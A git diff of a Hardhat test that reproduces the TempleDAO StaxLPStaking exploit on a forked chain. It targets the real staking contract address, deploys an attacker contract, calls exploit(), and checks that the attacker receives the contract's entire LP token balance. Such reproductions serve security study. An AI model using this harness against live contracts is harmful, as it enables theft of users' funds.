@@ -1,17 +1,16 @@
 import { Contract, Signer } from 'ethers';
 import { ethers } from 'hardhat';
-import { beforeEach, describe } from 'mocha';
 import { forkFrom } from './utils/fork';
-import dotenv from 'dotenv';
 import { getAbi } from './utils/abi';
+import { expect } from 'chai';
 
 describe('TempleDAO Exploit', async () => {
-  dotenv.config();
-
   let attacker: Signer;
+  let attackerContract: Contract;
   let stakingContract: Contract;
+  let tokenContract: Contract;
+
   const STAKING_CONTRACT_ADDRESS = '0xd2869042e12a3506100af1d192b5b04d65137941';
-  const { API_KEY } = process.env;
 
   before(async () => {
     // Block number from October 8, 3 days before the attack
@@ -20,15 +19,41 @@ describe('TempleDAO Exploit', async () => {
     // Get an attacker EOA that we can use
     [attacker] = await ethers.getSigners();
 
-    // Get the contract ABI
-    const contract_abi = await getAbi('contracts/StaxLPStakingExploit/StaxLPStakingABI.txt');
-    stakingContract = await ethers.getContractAt(
-      contract_abi,
-      '0xd2869042e12a3506100af1d192b5b04d65137941',
+    // Get the contract ABI and subsquently the deployed contracts for the
+    // staking contract as well as the LP token
+    const staking_contract_abi = await getAbi(
+      'contracts/StaxLPStakingExploit/StaxLPStakingABI.txt',
     );
+    const token_contract_abi = await getAbi('contracts/StaxLPStakingExploit/StaxLPTokenABI.txt');
+
+    stakingContract = await ethers.getContractAt(staking_contract_abi, STAKING_CONTRACT_ADDRESS);
+    tokenContract = await ethers.getContractAt(
+      token_contract_abi,
+      await stakingContract.stakingToken(),
+    );
+
+    // Deploy the attacker script
+    attackerContract = await (
+      await ethers.getContractFactory('StaxLPStakingExploit', attacker)
+    ).deploy(stakingContract.address, tokenContract.address);
   });
 
   it('Exploits successfully', async () => {
-    console.log(stakingContract);
+    // Before we start, we should have 0 LP tokens
+    expect(await tokenContract.balanceOf(attacker.getAddress())).to.be.eq(0);
+
+    // Get the current balance of the staking contract so we can make sure we
+    // get all the tokens at the end
+    const stakingContractBalanceBeforeAttack = await tokenContract.balanceOf(
+      stakingContract.address,
+    );
+
+    // Run our exploit
+    await attackerContract.exploit();
+
+    // Our token balance should match the original token balance in the contract
+    expect(await tokenContract.balanceOf(attacker.getAddress())).to.be.eq(
+      stakingContractBalanceBeforeAttack,
+    );
   });
 });
